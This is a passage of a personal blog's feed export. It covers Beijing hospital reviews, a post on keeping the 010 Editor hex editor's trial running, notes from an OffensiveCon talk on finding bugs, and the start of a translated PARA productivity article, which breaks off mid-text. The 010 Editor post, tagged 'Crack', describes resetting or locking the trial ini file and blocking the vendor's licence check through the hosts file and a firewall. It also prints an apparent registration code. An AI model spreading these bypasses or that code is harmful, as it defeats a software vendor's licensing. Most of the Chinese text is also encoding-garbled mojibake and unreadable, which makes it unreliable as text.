åŒ»é™¢è¾ƒå°ã€‚<br>ä¼˜ç‚¹ï¼šç¦»ç´«ç«¹æ¡¥è·ç¦»è¿‘ï¼Œæœ‰ä¿å¥ç§‘ï¼Œå°å­©æ‰“é¢„é˜²é’ˆä¸é”™ã€‚</p><p>ç©ºæ€»ï¼š</p><p>åœ¨è¿™ä¸ªåŒ»é™¢å¤šä¸ªç§‘å®¤çœ‹è¿‡ç—…ï¼Œå®¶äººè¿˜åœ¨è¿™åšè¿‡å¾®åˆ›æ‰‹æœ¯ã€‚</p><p>ç¼ºç‚¹ï¼šæŒ‚å·æœ‰ç‚¹éš¾ï¼Œäººå¤šï¼Œå„¿ç§‘æ°´å¹³ä¸€èˆ¬ã€‚<br>ä¼˜ç‚¹ï¼šä¸‰ç”²ï¼Œçš®è‚¤ç§‘åŒ—äº¬æœ‰åï¼Œå„ç§‘å®¤æ°´å¹³æ¯”è¾ƒå‡è¡¡ã€‚ä¿¡æ¯åŒ–ç¨‹åº¦é«˜ï¼Œçœ‹ç—…æŒºæ–¹ä¾¿ã€‚</p><p>æµ·æ€»ï¼š</p><p>è¿™ä¸ªåŒ»é™¢æˆ‘æ²¡æœ‰å»è¿‡ï¼Œè·ç¦»ç¨è¿œã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>010editor ä¿æŒè¯•ç”¨</title>
    <link href="/cn/010editor/"/>
    <url>/cn/010editor/</url>
    
    <content type="html"><![CDATA[<h2 id="è½¯ä»¶ä»‹ç»"><a href="#è½¯ä»¶ä»‹ç»" class="headerlink" title="è½¯ä»¶ä»‹ç»"></a>è½¯ä»¶ä»‹ç»</h2><p>010Editoræ˜¯ä¸€æ¬¾å¿«é€Ÿä¸”å¼ºå¤§çš„åå…­è¿›åˆ¶ç¼–è¾‘å™¨ã€‚ç”¨æ¥ç¼–è¾‘äºŒè¿›åˆ¶æ–‡ä»¶ã€‚æœ‰ä¸€ä¸ªå‹å¥½æ˜“äºä½¿ç”¨çš„ç•Œé¢ï¼Œæ— é™æ¬¡çš„<br>undoå’Œredoæ“ä½œã€‚å¦å¤–è¿˜å¯ä»¥æ‰“å°åå…­è¿›åˆ¶çš„å­—èŠ‚æˆ–è€…ä»¥ä¹¦ç­¾çš„æ–¹å¼æ ‡å‡ºæŸäº›é‡è¦çš„å­—èŠ‚ã€‚<br>æ”¯æŒäºŒè¿›åˆ¶æ¨¡æ¿ï¼ˆbinary templateï¼‰ç³»ç»Ÿã€‚</p><h2 id="ä¿æŒè¯•ç”¨"><a href="#ä¿æŒè¯•ç”¨" class="headerlink" title="ä¿æŒè¯•ç”¨"></a>ä¿æŒè¯•ç”¨</h2><p>å›½å¤–è½¯ä»¶å¾ˆå¤šæ—¶å€™ç›¸å½“åšé“äº†ï¼Œè¯•ç”¨åŸºæœ¬æ˜¯å…¨åŠŸèƒ½ï¼Œè½»å¾®å»¶æ—¶å’Œä¸èƒ½è‡ªåŠ¨æ›´æ–°äºŒè¿›åˆ¶æ¨¡æ¿ï¼Œå°±æ—¥å¸¸ä½¿ç”¨æ¥è¯´åŸºæœ¬<br>æ˜¯å®Œå…¨å¤Ÿç”¨äº†ã€‚</p><p>å…³é”®æ–‡ä»¶ä¸º <code>~/.config/SweetScape/010 Editor.ini</code>ï¼Œæ— æ³•ä½¿ç”¨çš„æ—¶ä¾¯å¯ä»¥æŠŠè¿™ä¸ªæ–‡ä»¶æ¸…ç©ºï¼Œå°†æ¢å¤30å¤©è¯•ç”¨çŠ¶æ€ï¼Œ<br>æˆ–è€…ç®€å•ç²—æš´çš„å°†æ–‡ä»¶è®¾ç½®ä¸ºåªè¯»ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 444 <span class="hljs-string">&quot;010 Editor.ini&quot;</span><br></code></pre></td></tr></table></figure><p>ç”¨IDAé€†å‘çš„æ—¶ä¾¯æ²¡æœ‰å‘ç°è¿™ä¸ªæ–‡ä»¶æ¯”è¾ƒå¥‡æ€ªã€‚è¿™ä¸ªæ–‡ä»¶æ˜¯ æ˜¯ä½¿ç”¨straceå‘½ä»¤å‘ç°çš„ï¼Œstraceå‘½ä»¤æ”¯æŒ <code>-e</code> çš„è¿‡<br>æ»¤å‚æ•°å°†æœ‰æ•ˆå‡å°‘è¾“å‡ºï¼Œä¸€èˆ¬æ¥è¯´çœ‹straceæ—¥å¿—æ–‡ä»¶å¯ä»¥ä»æœ€åå¾€å‰çœ‹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strace -e trace=file ./010editor<br></code></pre></td></tr></table></figure><p>ä»ä»£ç ä¸Šçœ‹æœ‰ä½¿ç”¨ç½‘ç»œéªŒè¯éœ€è¦åœ¨hostsæ–‡ä»¶ä¸­å±æ•ä¸¤ä¸ªç½‘ç«™ï¼Œ å¯ä»¥å‡å°‘ä¸€äº›ä¸å¿…è¦çš„éº»çƒ¦ã€‚</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> www.sweetscape.com<br><span class="hljs-number">127.0.0.1</span> www.010editor.com<br></code></pre></td></tr></table></figure><p>æˆ‘ç°åœ¨å·²ç»æ˜¯æ³¨å†Œç”¨æˆ·äº†ï¼Œåœ¨å¾ˆé•¿çš„ä¸€æ®µæ—¶é—´å†…ï¼Œè¿™æ–¹æ³•æ˜¯ç®¡ç”¨çš„ï¼Œåšä¸ªå¤‡å¿˜ã€‚</p><p>scz è¡¥å……ï¼š</p><p>ä¹‹å‰githubä¸Šçš„é‚£ä¸ªå¼€æºkeygenè¿˜èƒ½ç”¨ï¼Œæˆ–è€…å°±ç”¨</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">user</span>    <span class="hljs-title">user</span><br>pass    <span class="hljs-number">3470</span>D4AC7CEFACD9297A<br></code></pre></td></tr></table></figure><p>åªæ˜¯hostsæ›´æ”¹å¯èƒ½ä¸å¤Ÿï¼Œwindowsä¸Šç”¨wf.mscé˜»æ­¢010 Editorè”ç½‘ï¼ŒLinuxå¥½åƒæ²¡æœ‰ç®€å•åŠæ³•é˜»æ­¢ç‰¹å®šè¿›ç¨‹è”ç½‘ï¼Œ<br>åªèƒ½å˜ç›¸åˆ©ç”¨uidã€gidè¾¾æˆç›®çš„ã€‚</p><p>How to block internet access to certain programs on Linux<br><a href="https://serverfault.com/questions/550276/how-to-block-internet-access-to-certain-programs-on-linux">https://serverfault.com/questions/550276/how-to-block-internet-access-to-certain-programs-on-linux</a></p><p><a href="https://unix.stackexchange.com/questions/104830/block-specific-application-with-iptables">https://unix.stackexchange.com/questions/104830/block-specific-application-with-iptables</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>Crack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Keynote - How Do You Actually Find Bugs?</title>
    <link href="/en/How_do_you_actually_find_bugs/"/>
    <url>/en/How_do_you_actually_find_bugs/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.youtube.com/watch?v=7Ysy6iA2sqA&ab_channel=OffensiveCon">https://www.youtube.com/watch?v=7Ysy6iA2sqA&amp;ab_channel=OffensiveCon</a></p><ul><li>Temperament<ul><li>Curiosity</li><li>Detail-oriented</li><li>Ability to deal with failure and continual evidence that youâ€™re wrong</li></ul></li><li>Learn how to deal with failure<ul><li>Two projects (can be unrealeted, or different parts of the same)<ul><li>Learn to recognize whe you have hit a wall and have become unproductive</li><li>Switch to your secondary project</li></ul></li><li>Consider having a development project as your seconary project<ul><li>Do an achiveable, measurable task</li><li>Regain a sense of achievement</li></ul></li></ul></li><li>Moving on - Knowning when to quit<ul><li>You will return it in the future</li></ul></li><li>Motivation - Remaining Enager<ul><li>The more youâ€™re curious about how a technology works or how an algorithm achives its goal, the less monotonous code review is</li></ul></li><li>Motivation - bug patching<ul><li>bugs being patched is frustrating<ul><li>â€¦ but they are evidence that you were on the right track!</li></ul></li></ul></li><li>Confidence<ul><li>Research is a daunting filed to enter</li><li>Some security reseacher you respect had the same self-doubt coming in, and have recurrences from time to time</li><li>Growth mindset: â€œI canâ€™t do that â€¦ Yetâ€</li></ul></li><li>Bias and assumptions<ul><li>Common code reviewer biases<ul><li>Everyone has looked at the already (many eyes make all bugs shallow)</li><li>Even if I found something, it will be unexploitable (Server side)</li><li>The X attack surface is not interesting now (eg, media parsing in browsers)</li><li>There are no more bugs in this</li><li>The protocol doesnâ€™t allow you to do X</li></ul></li></ul></li><li>Auditing Process<ul><li>Understanding the code</li><li>Documenting your findings</li><li>Identifying bias</li><li>Tooling</li><li>Revisit the code base</li><li>Analyze failures</li></ul></li><li>Attampt to understand the code<ul><li>A lot of people try to short-circuit this process<ul><li>Reliance on tools</li><li>Fuzzers&#x2F;static analyzers are a guide, not the whole process</li></ul></li><li>Many of todayâ€™s vulnerabilities are complex, and require in-depth understanding of the codebase</li><li>The more you understand about how the program works, the better equipped you are to find bugs ( and exploit them)</li><li>The best way to understand how something works is to explain to someone else</li></ul></li><li>What Iâ€™m looking for<ul><li>software risk &#x3D; available attack surface * complexity</li><li>attack surface can be indirect<ul><li>even mitigations are attack surface</li></ul></li><li>often you initial perception of attack surface is naive<ul><li>Hidden&#x2F;non-obvious attack surfaces are the best</li></ul></li><li>Complexity is plentiful<ul><li>Feature driven (thanks w3c)</li><li>Legacy support</li><li>Often avoidable: the anomaly of cheap complexity</li></ul></li></ul></li><li>Borrwoing ideas<ul><li>Bugtracker &#x2F; Diffs<ul><li>Can show where a bug is</li><li>Can inspire new ideas: variants, same bugs in other codebase</li><li>Mean but viable: track commits by error-prone developers</li></ul></li><li>Comments in the codebase<ul><li>Descripbe things Iâ€™d never thought of</li></ul></li></ul></li><li>Document your findings<ul><li>Get into the habit of documenting<ul><li>ideas, bugs candidates, idiosyncrasies, data structure, algorithms</li></ul></li><li>Documenting failed ideas is as important as documenting successful ones<ul><li>avoids repeating thie idea sometime later</li></ul></li><li>Long term view: Iâ€™m going to revisit this later</li></ul></li><li>Revisit code bases and failed bugs<ul><li>code bases are not static<ul><li>coee rewritten</li><li>Features added&#x2F;changed</li></ul></li><li>Environment is not static</li></ul></li><li>Analyze your failures<ul><li>if someone succeeds where you didnâ€™t, have a look at what they found</li><li>Try to figure out: why did I miss it?</li><li>Is this a one-off or teachable trick&#x2F;blind spot</li><li>Can you improve on that?</li><li>Is there a pattern in those falures?</li><li>Failures is an oppotunity to learn</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(è¯‘æ–‡) ä¸€ç§’é’Ÿå†…æ•´ç†æ•°å­—ç”Ÿæ´»çš„ç³»ç»Ÿ by claude</title>
    <link href="/cn/PARA/"/>
    <url>/cn/PARA/</url>
    
    <content type="html"><![CDATA[<p>The PARA Method: The Simple System for Organizing Your Digital Life in Seconds<br><a href="https://fortelabs.com/blog/para">https://fortelabs.com/blog/para</a></p><p>æƒ³è±¡ä¸€ä¸‹å®Œç¾çš„ç»„ç»‡ç³»ç»Ÿã€‚ä¸€ä¸ªç³»ç»Ÿä¼šå‘Šè¯‰ä½ å¦‚ä½•ç¡®åˆ‡åœ°æŠŠç”Ÿæ´»ä¸­çš„æ¯ä¸€ä»¶ä¿¡æ¯-æ¯ä»½æ–‡ä»¶ã€ç¬”è®°ã€æ—¥ç¨‹ã€å¤§çº²å’Œç ”ç©¶çš„ç¢ç‰‡-æ”¾åœ¨å“ªé‡Œ,ä»¥åŠä¹‹åå¦‚ä½•è½»æ¾åœ°æ‰¾åˆ°å®ƒä»¬ã€‚</p><p>è¿™æ ·çš„ç³»ç»Ÿéœ€è¦éå¸¸ç®€å•æ˜“ç”¨,ä¹Ÿéå¸¸å®¹æ˜“ç»´æŠ¤ã€‚æ¯•ç«Ÿ,åªæœ‰æœ€ç®€å•ã€æœ€è½»æ¾çš„ä¹ æƒ¯èƒ½é•¿æœŸåšæŒã€‚</p><p>å®ƒéœ€è¦çµæ´»é€‚åº”ä½ åœ¨ä¸åŒäººç”Ÿé˜¶æ®µçš„éœ€æ±‚,åŒæ—¶ä¹Ÿéœ€è¦å…¨é¢,è¿™æ ·ä½ å¯ä»¥åœ¨å­˜å‚¨ä¿¡æ¯çš„å„ä¸ªåœ°æ–¹ä½¿ç”¨å®ƒ,æ¯”å¦‚ä½ çš„ç”µè„‘æ–‡ä»¶ç³»ç»Ÿã€äº‘å­˜å‚¨å¹³å°(å¦‚Dropboxæˆ–è°·æ­Œäº‘ç«¯ç¡¬ç›˜)æˆ–è€…æ•°å­—ç¬”è®°åº”ç”¨ã€‚</p><p>ä½†æ˜¯æœ€é‡è¦çš„æ˜¯,ç†æƒ³çš„ç»„ç»‡ç³»ç»Ÿèƒ½å¤Ÿç›´æ¥å¸¦æ¥å·¥ä½œå’Œç”Ÿæ´»ä¸­çš„å®å®åœ¨åœ¨çš„å¥½å¤„ã€‚å®ƒä¼šæå¤§åœ°åŠ é€Ÿä½ å®Œæˆæœ€é‡è¦çš„é¡¹ç›®å’Œå®ç°ç›®æ ‡ã€‚</p><p>æ¢å¥è¯è¯´, <strong>ç»„ç»‡ä½ çš„ç”Ÿæ´»çš„æœ€ä½³ç³»ç»Ÿ,æ˜¯å¯æ“ä½œçš„</strong>ã€‚</p><p>å®ƒä¸ä¼šç»™ä½ åˆ¶é€ æ›´å¤šéšœç¢,ä¸ä¼šæ¨è¿Ÿé‚£äº›èƒ½å¸¦æ¥è¿›æ­¥çš„è¡ŒåŠ¨,è€Œæ˜¯è®©è¿™äº›è¡ŒåŠ¨æ›´æ¥è¿‘å’Œæ›´å®¹æ˜“å¼€å§‹ä¸å®Œæˆã€‚</p><p>é€šè¿‡åå¤šå¹´çš„ä¸ªäººå®è·µã€æŒ‡å¯¼æ•°åƒå­¦ç”Ÿä»¥åŠè¾…å¯¼ä¸–ç•Œçº§ä¸“ä¸šäººå£«,æˆ‘å·²ç»åˆ¶å®šå‡ºè¿™æ ·çš„ç³»ç»Ÿã€‚</p><p><strong>å®ƒè¢«ç§°ä¸ºPARA - ä¸€ä¸ªç®€å•ã€å…¨é¢çš„ä¸”æå…¶çµæ´»çš„ç³»ç»Ÿ,å¯ä»¥ç»„ç»‡ä»»ä½•ç±»å‹çš„æ•°å­—ä¿¡æ¯,è·¨ä»»ä½•å¹³å°ã€‚</strong></p><p>æˆ‘å‘ä½ ä¿è¯,å®ƒä¸ä»…èƒ½æŠŠä½ çš„ç”Ÿæ´»äº•äº•æœ‰æ¡,è¿˜èƒ½è®©ä½ æŒæ¡ä¸€å¥—å·¥å…·,å·§å¦™åœ°æŒæ§ä¿¡æ¯æµ,ä»¥å®ç°ä½ è®¾æƒ³çš„ä¸€åˆ‡ã€‚</p><span id="more"></span><h2 id="åŒ…å«ä½ æ•´ä¸ªç”Ÿæ´»çš„4ä¸ªç±»åˆ«"><a href="#åŒ…å«ä½ æ•´ä¸ªç”Ÿæ´»çš„4ä¸ªç±»åˆ«" class="headerlink" title="åŒ…å«ä½ æ•´ä¸ªç”Ÿæ´»çš„4ä¸ªç±»åˆ«"></a>åŒ…å«ä½ æ•´ä¸ªç”Ÿæ´»çš„4ä¸ªç±»åˆ«</h2><p>PARA åŸºäºä¸€ä¸ªç®€å•çš„è§‚å¯Ÿ:åªæœ‰4ä¸ªç±»åˆ«æ¶µç›–äº†ä½ ç”Ÿæ´»ä¸­çš„æ‰€æœ‰ä¿¡æ¯ã€‚<br><img src="https://raw.githubusercontent.com/henices/pictures/master/para1.png" alt="para1"></p><p>ä½ æœ‰æ­£åœ¨ç§¯ææ¨è¿›çš„<strong>é¡¹ç›®</strong> - <strong>çŸ­æœŸåŠªåŠ›</strong> (åœ¨å·¥ä½œæˆ–ç§äººç”Ÿæ´»ä¸­),ä½ ä»¥æŸç§ç›®æ ‡ä¸ºæŒ‡å¯¼è€Œè¿›è¡Œã€‚ä¾‹å¦‚:</p><ul><li>å®Œæˆç½‘é¡µè®¾è®¡</li><li>ä¹°ä¸€å°æ–°ç”µè„‘</li><li>å†™ç ”ç©¶æŠ¥å‘Š</li><li>æ”¹é€ æµ´å®¤</li><li>å®Œæˆè¥¿ç­ç‰™è¯­è¯¾ç¨‹</li><li>å¸ƒç½®æ–°çš„å®¢å…å®¶å…·</li></ul><p>ä½ <strong>æœ‰è´£ä»»</strong>é¢†åŸŸ - éœ€è¦<strong>æŒç»­å…³æ³¨</strong>çš„å·¥ä½œå’Œç”Ÿæ´»ä¸­çš„é‡è¦éƒ¨åˆ†ã€‚å¯èƒ½åŒ…æ‹¬:</p><ul><li>å·¥ä½œè´£ä»»,æ¯”å¦‚å¸‚åœºè¥é”€ã€äººåŠ›èµ„æºã€äº§å“ç®¡ç†ã€ç ”å‘ã€æˆ–å·¥ç¨‹</li><li>ä¸ªäººè´£ä»»,æ¯”å¦‚å¥åº·ã€è´¢åŠ¡ã€å­©å­ã€å†™ä½œã€æ±½è½¦ã€æˆ–å®¶åº­</li></ul><p>ç„¶åä½ å¯¹ä¸€ç³»åˆ—<strong>æ„Ÿå…´è¶£çš„ä¸»é¢˜</strong>æœ‰<strong>èµ„æº</strong>,æ¯”å¦‚:</p><ul><li>å¹³é¢è®¾è®¡</li><li>ä¸ªäººæ•ˆç‡</li><li>æœ‰æœºå›­è‰º</li><li>å’–å•¡</li><li>ç°ä»£å»ºç­‘</li><li>ç½‘é¡µè®¾è®¡</li><li>æ—¥è¯­</li><li>æ³•å›½æ–‡å­¦</li><li>ç¬”è®°</li><li>æ°”åŠŸ</li><li>ä¹ æƒ¯å…»æˆ</li><li>æ‘„å½±</li><li>è¥é”€èµ„äº§</li></ul><p>æœ€å,ä½ æœ‰<strong>æ¡£æ¡ˆ</strong>, åŒ…æ‹¬<strong>å‰ä¸‰ç±»ä¸å†æ´»è·ƒ</strong>ä½†ä½ å¯èƒ½æƒ³ä¿å­˜ä»¥ä¾›æœªæ¥å‚è€ƒçš„ä»»ä½•å†…å®¹:</p><ul><li>ä½ å®Œæˆæˆ–æç½®çš„é¡¹ç›®</li><li>ä¸å†ç›¸å…³æˆ–æ´»è·ƒçš„é¢†åŸŸ</li><li>ä½ ä¸å†æ„Ÿå…´è¶£çš„èµ„æº</li></ul><p>å°±æ˜¯è¿™æ ·!å››ä¸ªé¡¶å±‚æ–‡ä»¶å¤¹ â€”â€” é¡¹ç›®ã€é¢†åŸŸã€èµ„æºå’Œæ¡£æ¡ˆ â€”â€” æ¯ä¸ªåŒ…å«å°‘é‡ä¸“é—¨é’ˆå¯¹ä½ ç”Ÿæ´»ä¸­çš„æ¯ä¸ªæ´»åŠ¨é¡¹ç›®ã€è´£ä»»é¢†åŸŸã€èµ„æºå’Œæ¡£æ¡ˆçš„å­æ–‡ä»¶å¤¹ã€‚<br><img src="https://raw.githubusercontent.com/henices/pictures/master/para2.png" alt="para2"></p><p>ä½ å¯èƒ½éš¾ä»¥ç›¸ä¿¡,ä¸€ä¸ªå¤æ‚çš„ã€ç°ä»£çš„äººç”Ÿå°±åƒä½ çš„,èƒ½è¢«ç®€åŒ–æˆåªæœ‰4ä¸ªç±»åˆ«ã€‚ä½ å¯èƒ½è§‰å¾—ä½ è¦å¤„ç†çš„è¿œæ¯”è¿™æ ·ä¸€ä¸ªç®€å•çš„ç³»ç»Ÿèƒ½å®¹çº³çš„è¦å¤šã€‚</p><p>ä½†è¿™æ­£æ˜¯è¦ç‚¹:å¦‚æœä½ çš„ç»„ç»‡ç³»ç»Ÿå’Œä½ çš„ç”Ÿæ´»ä¸€æ ·å¤æ‚,é‚£ä¹ˆç»´æŠ¤å®ƒçš„éœ€æ±‚æœ€ç»ˆä¼šå¤ºèµ°ä½ ç”Ÿæ´»æ‰€éœ€çš„æ—¶é—´å’Œç²¾åŠ›ã€‚</p><p>ä½ ç”¨æ¥ç»„ç»‡ä¿¡æ¯çš„ç³»ç»Ÿå¿…é¡»éå¸¸ç®€å•,ä»¥è‡³äºå®ƒèƒ½é‡Šæ”¾ä½ çš„æ³¨æ„åŠ›,è€Œä¸æ˜¯å ç”¨æ›´å¤šæ³¨æ„åŠ›ã€‚ ä½ çš„ç³»ç»Ÿå¿…é¡»ç»™ä½ èŠ‚çœæ—¶é—´,è€Œä¸æ˜¯å ç”¨æ—¶é—´ã€‚</p><h2 id="å…³é”®åŸåˆ™-æŒ‰é¡¹ç›®-Project-å’Œç›®æ ‡-Goal-ç»„ç»‡ä¿¡æ¯"><a href="#å…³é”®åŸåˆ™-æŒ‰é¡¹ç›®-Project-å’Œç›®æ ‡-Goal-ç»„ç»‡ä¿¡æ¯" class="headerlink" title="å…³é”®åŸåˆ™ - æŒ‰é¡¹ç›®(Project)å’Œç›®æ ‡(Goal)ç»„ç»‡ä¿¡æ¯"></a>å…³é”®åŸåˆ™ - æŒ‰é¡¹ç›®(Project)å’Œç›®æ ‡(Goal)ç»„ç»‡ä¿¡æ¯</h2><p>æˆ‘ä»¬å¤§å¤šæ•°äººé¦–å…ˆåœ¨å­¦æ ¡é‡Œå­¦ä¼šå¦‚ä½•ç»„ç»‡ä¿¡æ¯ã€‚æˆ‘ä»¬è¢«æ•™å¯¼æ ¹æ®å­¦ç§‘,æ¯”å¦‚æ•°å­¦ã€å†å²æˆ–åŒ–å­¦,æ¥åˆ†ç±»æˆ‘ä»¬çš„è¯¾å ‚ç¬”è®°ã€è®²ä¹‰å’Œå­¦ä¹ ææ–™ã€‚</p><p>ä½†ç„¶ååœ¨ä¸çŸ¥ä¸è§‰ä¸­,æˆ‘ä»¬åˆå°†è¿™ç§åšæ³•å¸¦å…¥äº†æˆäººç”Ÿæ´»ã€‚æˆ‘ä»¬ç»§ç»­æ ¹æ®éå¸¸å®½æ³›çš„ä¸»é¢˜æ¯”å¦‚â€œå¸‚åœºè¥é”€â€ã€â€œå¿ƒç†å­¦â€ã€â€œå•†ä¸šâ€æˆ–â€œæ€æƒ³â€æ¥åˆ†ç±»æˆ‘ä»¬çš„æ–‡æ¡£å’Œæ–‡ä»¶ã€‚</p><p>è¿™åœ¨ä½ çš„å­¦ä¸šä¹‹åçš„èŒä¸šç”Ÿæ¶¯ä¸­æ˜¯å®Œå…¨æ²¡æœ‰æ„ä¹‰çš„ã€‚åœ¨å·¥ä½œåœºæ‰€,æ²¡æœ‰è¯¾ç¨‹,æ²¡æœ‰è€ƒè¯•,æ²¡æœ‰æˆç»©,ä¹Ÿæ²¡æœ‰æ–‡å‡­ã€‚æ²¡æœ‰è€å¸ˆä¼šå‘Šè¯‰ä½ åº”è¯¥è®°ä¸‹ä»€ä¹ˆæ¥å‡†å¤‡æœŸæœ«è€ƒè¯•,å› ä¸ºæ ¹æœ¬å°±æ²¡æœ‰è€ƒè¯•ã€‚</p><p><strong>ä½ åœ¨å·¥ä½œå’Œç”Ÿæ´»ä¸­æ‰€æ‹¥æœ‰çš„,æ˜¯ä½ æ­£åœ¨åŠªåŠ›å®ç°çš„ç»“æœã€‚</strong>ä½ æ­£åœ¨åŠªåŠ›æ¨å‡ºæ–°äº§å“,è®¡åˆ’å®¶åº­åº¦å‡,åšå‡ºå…³é”®å†³å®š,åœ¨ä½ çš„ç¤¾åŒºæ‰¾åˆ°æ‰˜å„¿æ‰€,å‘è¡¨æ–°çš„å†™ä½œ,æˆ–å®ç°å­£åº¦é”€å”®ç›®æ ‡ã€‚</p><p>åœ¨ç¹å¿™çš„ä¸€å¤©ä¸­,å½“ä½ æ­£åœ¨åŠªåŠ›ä½¿è¿™äº›äº‹æƒ…å‘ç”Ÿæ—¶,ä½ ç»å¯¹æ²¡æœ‰æ—¶é—´åœ¨ä¸€ä¸ªå¹¿é˜”çš„ç±»åˆ«å¦‚â€œå¿ƒç†å­¦â€ä¸­æœå¯»ä½ éœ€è¦çš„é‚£ä¸€ç‚¹ä¿¡æ¯ã€‚</p><p>ä¸åœ¨å­¦æ ¡é‡Œæ ¹æ®å¹¿æ³›çš„å­¦ç§‘åˆ†ç±»ä¿¡æ¯ä¸åŒ,æˆ‘å»ºè®®ä½ æ ¹æ®ä½ ç°åœ¨è‡´åŠ›äºçš„é¡¹ç›®å’Œç›®æ ‡æ¥ç»„ç»‡ä¿¡æ¯ã€‚è¿™å°±æ˜¯â€œæŒ‰å¯æ“ä½œæ€§ç»„ç»‡â€è¿™ä¸ªæˆ‘å°†åœ¨æœ¬ä¹¦ä¸­åå¤å¼ºè°ƒçš„ç®´è¨€çš„å«ä¹‰ã€‚</p><p>æ¯”å¦‚,å½“ä½ åä¸‹æ¥å¤„ç†ä¸€ä¸ªå›¾å½¢è®¾è®¡é¡¹ç›®æ—¶,ä½ éœ€è¦ä¸è¯¥é¡¹ç›®ç›¸å…³çš„æ‰€æœ‰ç¬”è®°ã€æ–‡æ¡£ã€èµ„äº§å’Œå…¶ä»–ææ–™éƒ½é›†ä¸­åœ¨ä¸€èµ·,éšæ—¶å¯ç”¨ã€‚</p><p>è¿™ä¼¼ä¹å¾ˆæ˜æ˜¾,ä½†è¿™æ­£æ˜¯å¤§å¤šæ•°äººæ‰€åšçš„å®Œå…¨ç›¸åã€‚å¤§å¤šæ•°äººå€¾å‘äºæŠŠæ‰€æœ‰ç›¸å…³ææ–™æ•£å¸ƒåœ¨åå‡ ä¸ªä¸åŒçš„åœ°æ–¹,æ‰¾åˆ°å®ƒä»¬éœ€è¦èŠ±è´¹ä»–ä»¬åŠå°æ—¶çš„æ—¶é—´ã€‚</p><p>å¦‚ä½•ç¡®ä¿ä¸æ¯ä¸ªé¡¹ç›®æˆ–ç›®æ ‡ç›¸å…³çš„æ‰€æœ‰ææ–™éƒ½é›†ä¸­åœ¨ä¸€èµ·?ä½ ä»ä¸€å¼€å§‹å°±æŒ‰é‚£ç§æ–¹å¼ç»„ç»‡å®ƒä»¬ã€‚è¿™æ ·ä½ å°±çŸ¥é“è¯¥æŠŠæ¯æ ·ä¸œè¥¿æ”¾åœ¨å“ªé‡Œ,ä»¥åŠå“ªé‡Œå¯ä»¥æ‰¾åˆ°å®ƒä»¬ã€‚</p><h2 id="æŒ‰é¡¹ç›®ç»„ç»‡çš„åŠ›é‡"><a href="#æŒ‰é¡¹ç›®ç»„ç»‡çš„åŠ›é‡" class="headerlink" title="æŒ‰é¡¹ç›®ç»„ç»‡çš„åŠ›é‡"></a>æŒ‰é¡¹ç›®ç»„ç»‡çš„åŠ›é‡</h2><p>æˆ‘åœ¨æ—§é‡‘å±±æ¹¾åŒºä½œä¸ºç”Ÿäº§åŠ›æ•™ç»ƒå·¥ä½œäº†å‡ å¹´ã€‚é‚£æ˜¯ç§‘æŠ€ç¹è£çš„é¼ç››æ—¶æœŸ,ä¸–ç•Œä¸Šä¸€äº›æœ€å…·å½±å“åŠ›çš„å…¬å¸çš„é«˜ç®¡éƒ½åœ¨å¯»æ±‚ä»»ä½•æé«˜è¡¨ç°çš„æ–¹æ³•ã€‚æˆ‘å¾ˆä¹æ„æä¾›å¸®åŠ©ã€‚</p><p>æˆ‘ä¸ºå—æ—§é‡‘å±±ä¸€å®¶è‘—åçš„ç”Ÿç‰©æŠ€æœ¯å…¬å¸çš„å‡ ä½é«˜ç®¡è¿›è¡Œäº†æŒ‡å¯¼,ä»–ä»¬ä½äºä¸€åº§ä¿¯ç°æµ·æ¹¾çš„ç¾ä¸½æ ¡å›­å†…ã€‚æˆ‘è¿˜è®°å¾—ä¸€å¤©,åœ¨ç­‰å¾…ä¸‹ä¸€ä¸ªå®¢æˆ·â€”â€”ä¸€ä½è´Ÿè´£å¼€å‘å‡ ç§æ–°å‹æ•‘ç”Ÿè¯ç‰©çš„é«˜çº§ä¸»ç®¡æ—¶,å¤–é¢æ˜¯ç¾ä¸½çš„æ˜¥æ—¥ã€‚</p><p>ä»–åˆ°è¾¾å,æˆ‘ä»¬çš„æŒ‡å¯¼è¯¾å°±åƒå…¶ä»–æ¯ä¸€æ¬¡ä¸€æ ·,ä»æˆ‘çš„ä¸€ä¸ªç®€å•é—®é¢˜å¼€å§‹:â€œä½ æœ‰é¡¹ç›®åˆ—è¡¨å—?â€</p><p>å½“ä½œä¸ºç”Ÿäº§åŠ›æ•™ç»ƒä¸å®¢æˆ·åˆä½œæ—¶,æˆ‘æ€»ä¼šé¦–å…ˆè¦æ±‚ä»–ä»¬å±•ç¤ºé¡¹ç›®åˆ—è¡¨ã€‚æˆ‘éœ€è¦å®ƒæ¥äº†è§£ä»–ä»¬çš„å·¥ä½œç±»å‹ã€å½“å‰å·¥ä½œé‡å’Œä»–ä»¬æ­£åœ¨åŠªåŠ›æ¨è¿›çš„ä¼˜å…ˆäº‹é¡¹å’Œç»“æœã€‚</p><p>ä»–è¯´â€œå½“ç„¶!â€ç„¶åè¿…é€Ÿè®°ä¸‹ä»è®°å¿†ä¸­æ¶Œç°çš„åˆ—è¡¨(ç¬¬ä¸€ä¸ªè­¦å‘Šä¿¡å·),é€’ç»™æˆ‘ä¸€ä¸ªç±»ä¼¼ä¸‹é¢è¿™æ ·çš„åˆ—è¡¨:</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/para3.png" alt="para3"></p><p>ä½ çœ‹åˆ°é—®é¢˜äº†å—?å†ä»”ç»†çœ‹çœ‹ã€‚</p><p>æ 